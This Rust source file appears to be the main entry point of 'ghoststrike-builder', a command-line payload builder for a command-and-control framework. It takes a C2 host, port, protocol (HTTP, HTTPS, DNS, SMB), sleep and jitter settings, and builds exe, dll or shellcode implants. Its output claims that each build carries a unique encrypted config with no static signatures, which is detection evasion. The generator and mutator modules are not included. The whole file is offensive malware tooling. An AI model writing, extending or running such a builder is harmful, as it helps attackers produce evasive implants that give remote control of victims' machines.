mod generator;
mod mutator;

use anyhow::Result;
use clap::Parser;
use ghoststrike_common::{BuildConfig, ListenerProtocol, PayloadFormat};
use uuid::Uuid;

#[derive(Parser)]
#[command(name = "ghoststrike-builder", version)]
struct Args {
    /// C2 host/IP
    #[arg(long)]
    host: String,

    /// C2 port
    #[arg(long, default_value_t = 8080)]
    port: u16,

    /// Protocol: http | https | dns | smb
    #[arg(long, default_value = "http")]
    protocol: String,

    /// Listener UUID (optional)
    #[arg(long, default_value = "00000000-0000-0000-0000-000000000000")]
    listener_id: String,

    /// Sleep interval in milliseconds
    #[arg(long, default_value_t = 5000)]
    sleep_ms: u64,

    /// Jitter percentage
    #[arg(long, default_value_t = 10)]
    jitter_pct: u8,

    /// Payload format: exe | shellcode | dll
    #[arg(long, default_value = "exe")]
    format: String,

    /// Output path (will prompt if not given)
    #[arg(long)]
    output: Option<String>,

    /// DNS domain (for DNS protocol)
    #[arg(long)]
    dns_domain: Option<String>,

    /// Named pipe (for SMB protocol)
    #[arg(long)]
    pipe_name: Option<String>,
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    let protocol = match args.protocol.to_lowercase().as_str() {
        "https"     => ListenerProtocol::Https,
        "dns"       => ListenerProtocol::Dns,
        "smb"       => ListenerProtocol::Smb,
        _           => ListenerProtocol::Http,
    };

    let format = match args.format.to_lowercase().as_str() {
        "shellcode" => PayloadFormat::Shellcode,
        "dll"       => PayloadFormat::Dll,
        _           => PayloadFormat::Exe,
    };

    // Prompt for output path if not supplied.
    let output_path = match args.output {
        Some(p) => p,
        None    => prompt_output_path(&format),
    };

    let cfg = BuildConfig {
        listener_id: args.listener_id.parse().unwrap_or_else(|_| Uuid::nil()),
        c2_host:     args.host,
        c2_port:     args.port,
        protocol,
        sleep_ms:    args.sleep_ms,
        jitter_pct:  args.jitter_pct,
        format:      format.clone(),
        output_path: Some(output_path.clone()),
        dns_domain:  args.dns_domain,
        pipe_name:   args.pipe_name,
    };

    println!("[*] Generating {} payload…", format);
    println!("[*] C2: {}:{} ({})", cfg.c2_host, cfg.c2_port, cfg.protocol);

    let build_id = generator::generate(cfg, &output_path).await?;
    println!("[+] Build complete: {output_path}  (build_id: {build_id})");
    println!("[*] Every generated payload has a unique encrypted config blob — no static signatures.");

    Ok(())
}

fn prompt_output_path(format: &PayloadFormat) -> String {
    let ext = match format {
        PayloadFormat::Exe       => "exe",
        PayloadFormat::Shellcode => "bin",
        PayloadFormat::Dll       => "dll",
    };
    let default = format!("./payload.{ext}");

    print!("Output path [{}]: ", default);
    use std::io::Write;
    std::io::stdout().flush().ok();

    let mut input = String::new();
    std::io::stdin().read_line(&mut input).ok();
    let trimmed = input.trim();
    if trimmed.is_empty() { default } else { trimmed.to_string() }
}
